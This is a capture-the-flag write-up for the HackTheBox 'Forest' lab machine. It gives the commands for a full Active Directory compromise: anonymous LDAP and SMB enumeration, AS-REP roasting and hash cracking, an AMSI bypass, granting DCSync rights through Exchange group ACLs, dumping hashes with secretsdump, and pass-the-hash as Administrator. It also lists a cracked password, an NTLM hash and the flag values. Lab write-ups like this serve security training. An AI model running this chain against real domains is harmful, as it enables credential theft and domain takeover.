# HackTheBox — Forest
**Difficulty:** Easy  
**OS:** Windows  
**Tags:** Active Directory, AS-REP Roasting, DCSync, Pass-the-Hash, Account Operators, WriteDACL  

---

## Summary

Forest is a Windows Domain Controller running a misconfigured Active Directory environment. The attack chain begins with unauthenticated LDAP and SMB enumeration to discover a hidden service account vulnerable to AS-REP Roasting. After cracking the hash and gaining a WinRM shell, privilege escalation leverages the `Account Operators` group membership to abuse nested group permissions, granting DCSync rights on the domain object and ultimately dumping the Administrator NTLM hash for a Pass-the-Hash attack.

---

## Enumeration

### Nmap

```bash
nmap -sCV -Pn -p- --min-rate 5000 10.129.12.171 -oA forest
```

Key open ports:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Confirms Domain Controller |
| 389 | LDAP | Domain: htb.local |
| 445 | SMB | Windows Server 2016 |
| 5985 | WinRM | Remote management — shell access |
| 3268 | LDAP GC | Global Catalog |

The combination of ports 88 (Kerberos), 389 (LDAP), 3268 (Global Catalog), and 5985 (WinRM) confirms this is a Domain Controller. The domain is `htb.local`.

---

### LDAP Enumeration — Anonymous Bind

LDAP allowed anonymous (null) bind, exposing user accounts without credentials:

```bash
ldapsearch -x -H ldap://10.129.12.171 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName
```

Extracting usernames cleanly:

```bash
ldapsearch -x -H ldap://10.129.12.171 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName \
  | grep 'sAMAccountName' \
  | cut -d':' -f2 \
  | tail -n +2 \
  | tr -d ' ' \
  | tee usernames.txt
```

Human accounts discovered: `sebastien`, `lucinda`, `andy`, `mark`, `santi`

> **Note:** Anonymous LDAP bind does not always return every account. Accounts with restricted visibility require alternate enumeration methods.

---

### SMB Enumeration — Null Session

SMB null session revealed an additional account hidden from LDAP:

```bash
nxc smb 10.129.12.171 -u '' -p '' --users
```

Key finding: `svc-alfresco` — a service account not returned by LDAP anonymous bind.

---

## Foothold — AS-REP Roasting

With a complete username list, checked all accounts for Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`):

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.12.171 -usersfile usernames.txt 'htb.local/'
```

`svc-alfresco` was vulnerable — the KDC returned an AS-REP ticket encrypted with the account's password hash.

### Cracking the Hash

```bash
hashcat -m 18200 svc-alfresco.txt /path/to/rockyou.txt
```

**Credentials:** `svc-alfresco : s3rvice`

---

## User Flag

```bash
evil-winrm -i 10.129.12.171 -u 'svc-alfresco' -p 's3rvice'
```

```
type C:\Users\svc-alfresco\Desktop\user.txt
82075471f165ae2e7e500516d716a10e
```

---

## Privilege Escalation

### Enumeration — Group Membership

```powershell
whoami /all
```

`svc-alfresco` is a member of `BUILTIN\Account Operators` — a powerful built-in group that can create, modify, and add members to most AD groups.

### BloodHound — Attack Path

Collected AD data using RustHound-CE:

```bash
rusthound-ce -d htb.local -u svc-alfresco@htb.local -p 's3rvice' -i 10.129.12.171 -o ./bh-output -z -c All
```

BloodHound revealed the attack path:

```
SVC-ALFRESCO
  → MemberOf → SERVICE ACCOUNTS
  → MemberOf → PRIVILEGED IT ACCOUNTS
  → MemberOf → ACCOUNT OPERATORS
  → GenericAll → EXCHANGE TRUSTED SUBSYSTEM
  → GenericAll → HTB.LOCAL (domain object)
```

### Step 1 — Add to Exchange Trusted Subsystem

As `Account Operators`, we can add ourselves to `Exchange Trusted Subsystem`, which has `GenericAll` over the domain object:

```powershell
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members "svc-alfresco"
Get-ADGroupMember "Exchange Trusted Subsystem"
```

### Step 2 — Grant DCSync Rights via WriteDACL

Reconnected to get a fresh Kerberos token, then loaded PowerView (BC-Security fork) and granted DCSync rights on the domain object:

```powershell
Bypass-4MSI
. C:\Temp\powerview.ps1
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync -Verbose
```

This granted the following replication extended rights on `DC=htb,DC=local`:
- `DS-Replication-Get-Changes` (`1131f6aa-...`)
- `DS-Replication-Get-Changes-All` (`1131f6ad-...`)
- `DS-Replication-Get-Changes-In-Filtered-Set` (`89e95b76-...`)

### Step 3 — DCSync

With DCSync rights on the domain object, replicated all password hashes:

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.12.171
```

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

### Step 4 — Pass-the-Hash

```bash
evil-winrm -i 10.129.12.171 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

```
type C:\Users\Administrator\Desktop\root.txt
eca32300804ae679a731949202bd92b8
```

---

## Root Flag

```
eca32300804ae679a731949202bd92b8
```

---

## Attack Chain Summary

```
Anonymous LDAP bind
       ↓
SMB null session → svc-alfresco discovered
       ↓
AS-REP Roasting → hash cracked → s3rvice
       ↓
WinRM shell → user flag
       ↓
Account Operators membership
       ↓
Add to Exchange Trusted Subsystem (GenericAll on domain)
       ↓
PowerView WriteDACL → DCSync rights granted
       ↓
secretsdump → Administrator NTLM hash
       ↓
Pass-the-Hash → Administrator shell → root flag
```

---

## Key Takeaways

- **Anonymous LDAP bind** doesn't always return all accounts — cross-reference with SMB/RPC enumeration
- **AS-REP Roasting** targets accounts with pre-authentication disabled; no credentials required
- **Account Operators** is a high-value group — members can manipulate most AD groups
- **Exchange installations** introduce privileged groups (`Exchange Trusted Subsystem`, `Exchange Windows Permissions`) that often have dangerous ACLs on the domain object
- **DCSync** requires replication extended rights on the domain object — once granted, all hashes are exposed
- **Pass-the-Hash** with NTLM allows authentication without knowing the plaintext password
